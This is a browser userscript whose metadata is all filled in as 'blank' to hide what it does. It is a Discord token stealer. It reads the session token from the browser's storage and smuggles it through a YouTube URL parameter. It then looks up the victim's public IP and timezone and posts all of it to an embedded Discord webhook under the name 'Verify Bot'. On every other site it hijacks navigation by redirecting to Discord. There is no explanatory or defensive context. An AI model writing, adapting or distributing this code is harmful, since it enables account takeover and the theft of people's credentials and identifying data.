// ==UserScript==
// @name         blank
// @namespace    blank
// @version      0.1
// @description  blank
// @author       blank
// @include      http://*
// @include      https://*
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    const webhookURL = 'https://discord.com/api/webhooks/1350767296502829057/QXf2IHKtpA7WcO-EAJeAEYx2ab73clyvvkXKgdTD2dHubaBYL7_nJr2wytxAesKmYf5H';

    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const param = atob(url.searchParams.get("v"));
        if (param != null) {

            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const message = {
                        username: "Verify Bot",
                        embeds: [
                            {
                                title: "Logged Info",
                                description: `IP: ${ip}\nTimezone: ${timezone}\nToken: ${param}`,
                                color: 16711935 // makes it pink
                            }
                        ]
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .catch(error => console.error('Error1:', error));
                })
                .catch(error => console.error('Error2:', error));
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {

        const token = localStorage.token;
        if (token != null) {
            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
        }
    } else {

        window.location.href = "https://discord.com/channels/@me";
    }
})();
